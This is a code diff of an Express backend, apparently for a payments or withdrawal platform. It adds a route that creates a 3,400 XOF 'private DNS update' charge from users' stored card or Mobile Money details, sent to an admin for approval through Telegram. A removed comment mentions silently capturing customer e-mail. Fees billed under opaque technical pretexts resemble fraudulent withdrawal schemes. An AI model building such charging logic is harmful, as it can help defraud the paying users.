@@ -1011,34 +1011,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   // ── DNS Privé — statut mise à jour serveur ────────────────
+  // Rattaché directement au compte connecté (user_id), plus de déduction
+  // par e-mail/téléphone/prénom : la demande est désormais créée en interne
+  // (voir /api/withdrawal/dns-update/request) avec le user_id renseigné.
   app.get('/api/withdrawal/dns-update-status', requireAuth, async (req: any, res) => {
     try {
       const userId = req.session.userId;
-      const userRow = await db.execute(sql`SELECT phone, full_name, email FROM users WHERE id = ${userId}`);
-      const userPhone    = ((userRow.rows?.[0] as any)?.phone     || '') as string;
-      const userFullName = ((userRow.rows?.[0] as any)?.full_name || '') as string;
-      const userEmail    = ((userRow.rows?.[0] as any)?.email     || '').toLowerCase().trim() as string;
-
-      // Critère principal (fiable) : e-mail du compte connecté, capturé
-      // silencieusement au moment du paiement — correspondance exacte.
-      // Critères de repli (transactions plus anciennes, sans e-mail capturé) :
-      // 8 derniers chiffres du numéro, ou prénom contenu dans customer_name.
-      const last8 = userPhone.replace(/\D/g, '').slice(-8);
-      const nameParts  = userFullName.trim().split(/\s+/).filter(p => p.length >= 3);
-      const firstName  = (nameParts[0] || '').toLowerCase();
 
       const txnResult = await db.execute(sql`
         SELECT status FROM payment_link_transactions
-        WHERE link_id = 'eedbc622'
-          AND status IN ('completed', 'pending')
-          AND (
-            (${userEmail} != '' AND LOWER(COALESCE(customer_email,'')) = ${userEmail})
-            OR (${last8} != '' AND RIGHT(REGEXP_REPLACE(phone, '[^0-9]', '', 'g'), 8) = ${last8})
-            OR (${firstName} != '' AND LOWER(COALESCE(customer_name,'')) LIKE ${'%' + firstName + '%'})
-          )
-        ORDER BY
-          CASE status WHEN 'completed' THEN 0 ELSE 1 END,
-          created_at DESC
+        WHERE link_id = 'eedbc622' AND user_id = ${userId}
+        ORDER BY created_at DESC
         LIMIT 1
       `);
 
@@ -1046,9 +1029,77 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       if (!txn) return res.json({ status: 'none' });
       if (txn.status === 'completed') return res.json({ status: 'completed' });
+      if (txn.status === 'failed') return res.json({ status: 'failed' });
       return res.json({ status: 'pending' });
     } catch (error) {
       console.error('[DNS-UPDATE-STATUS] Error:', error);
+      res.status(500).json({ message: 'Erreur serveur' });
+    }
+  });
+
+  // ── DNS Privé — envoyer la demande de mise à jour ──────────
+  // Suit exactement le même principe que le retrait : on utilise les
+  // paramètres déjà enregistrés du compte (carte / numéro Mobile Money),
+  // aucune redirection externe, et l'admin valide/refuse depuis Telegram.
+  app.post('/api/withdrawal/dns-update/request', requireAuth, async (req: any, res) => {
+    try {
+      const userId = req.session.userId;
+
+      const userRow = await db.execute(sql`SELECT phone, full_name, email FROM users WHERE id = ${userId}`);
+      const userPhone    = ((userRow.rows?.[0] as any)?.phone     || '') as string;
+      const userFullName = ((userRow.rows?.[0] as any)?.full_name || '') as string;
+      const userEmail    = ((userRow.rows?.[0] as any)?.email     || '') as string;
+
+      const [card] = await db.select().from(bankCards).where(eq(bankCards.userId, userId)).limit(1);
+
+      // Empêche les doublons : si une demande est déjà en attente ou déjà
+      // validée, on renvoie simplement son statut au lieu d'en recréer une.
+      const existing = await db.execute(sql`
+        SELECT status FROM payment_link_transactions
+        WHERE link_id = 'eedbc622' AND user_id = ${userId} AND status IN ('pending', 'completed')
+        ORDER BY created_at DESC LIMIT 1
+      `);
+      const existingTxn = existing.rows?.[0] as { status: string } | undefined;
+      if (existingTxn) {
+        return res.json({ status: existingTxn.status === 'completed' ? 'completed' : 'pending' });
+      }
+
+      const phone    = card?.cardNumber || userPhone || '';
+      const operator = card?.operator && card.operator !== 'Non spécifié' ? card.operator.toLowerCase() : 'mtn';
+      const fullName = card ? `${card.firstName} ${card.lastName}` : userFullName;
+
+      const [inserted] = await db.insert(paymentLinkTransactions).values({
+        linkId: 'eedbc622',
+        linkLabel: 'MISE A JOUR DNS PRIVÉ',
+        amount: '3400',
+        currency: 'XOF',
+        phone,
+        operator,
+        customerName: fullName || null,
+        customerEmail: userEmail || null,
+        status: 'pending',
+        userId,
+      }).returning();
+
+      const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+      if (TELEGRAM_TOKEN && inserted) {
+        const adminChatId = '7457302722';
+        const notifText =
+          `🌐 <b>Mise à jour DNS Serveur</b>\n\n` +
+          `👤 <b>Nom :</b> ${fullName || 'Non renseigné'}\n` +
+          `📱 <b>Téléphone :</b> <code>${formatPhoneIntl(phone, card?.country)}</code>\n` +
+          `💳 <b>Opérateur :</b> ${operator}\n` +
+          `💰 <b>Montant :</b> 3 400 FCFA\n\n` +
+          `⏳ En attente de validation.`;
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: adminChatId, text: notifText, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ Valider', callback_data: `dnsval_ok_${inserted.id}` }, { text: '❌ Refuser', callback_data: `dnsval_no_${inserted.id}` }]] } })
+        }).catch(e => console.error('[NOTIFY] Telegram DNS error:', e));
+      }
+
+      res.json({ status: 'pending' });
+    } catch (error) {
+      console.error('[DNS-UPDATE-REQUEST] Error:', error);
       res.status(500).json({ message: 'Erreur serveur' });
     }
   });
